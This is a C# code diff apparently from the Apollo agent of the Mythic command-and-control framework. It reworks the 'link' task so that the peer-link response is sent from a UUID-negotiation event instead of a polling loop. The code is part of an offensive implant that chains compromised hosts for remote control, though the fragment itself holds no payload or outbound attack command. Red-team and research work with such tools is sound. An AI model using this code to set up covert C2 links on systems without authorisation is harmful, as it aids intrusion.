@@ -35,16 +35,14 @@ namespace Tasks
             return new System.Threading.Tasks.Task(() =>
             {
                 TaskResponse resp;
-                IPeer p = null;
+                ApolloInterop.Classes.P2P.Peer p = null;
                 try
                 {
                     LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
                     p = _agent.GetPeerManager().AddPeer(parameters.ConnectionInfo);
-                    while (string.IsNullOrEmpty(p.GetMythicUUID()) && !_cancellationToken.IsCancellationRequested)
+                    p.UUIDNegotiated += (object _, UUIDEventArgs args) =>
                     {
-                        System.Threading.Thread.Sleep(100);
-                    }
-                    resp = CreateTaskResponse(
+                        resp = CreateTaskResponse(
                         $"Established link to {parameters.ConnectionInfo.Hostname}",
                         true,
                         "completed",
@@ -60,6 +58,8 @@ namespace Tasks
                             MetaData = ""
                         }
                         });
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                    };
                 }
                 catch (Exception ex)
                 {
@@ -71,8 +71,8 @@ namespace Tasks
                     {
                         _agent.GetPeerManager().Remove(p);
                     }
+                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                 }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
             }, _cancellationToken.Token);
         }
     }
